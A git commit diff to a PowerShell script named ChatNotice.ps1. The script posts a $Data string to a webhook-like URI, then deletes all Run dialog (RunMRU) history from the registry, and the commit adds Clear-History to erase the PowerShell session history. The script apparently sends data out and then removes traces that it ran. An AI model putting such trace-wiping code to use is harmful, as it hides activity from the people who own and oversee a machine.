e23149474d18e10c650f42147216a7850a5f8cf9
Clevenger <20169262+jeffclevenger@users.noreply.github.com>
2022-05-03 12:16:35 -0500

    Update ChatNotice.ps1
    added clear history for the session

--- ChatNotice.ps1
+++ ChatNotice.ps1
@@ -8,7 +8,8 @@ try {
 	$body = '{"text":"' + $Data + '"}'
 	$headers = @{'Content-Type' = 'application/json; charset=UTF-8'}
 	Invoke-RestMethod -Uri $uri -Method POST -body $body -Headers $headers
-    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+	Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+	Clear-History
 }
 catch {
     $_ | Out-File "$($PSScriptRoot)\..\Errors\errors.log"
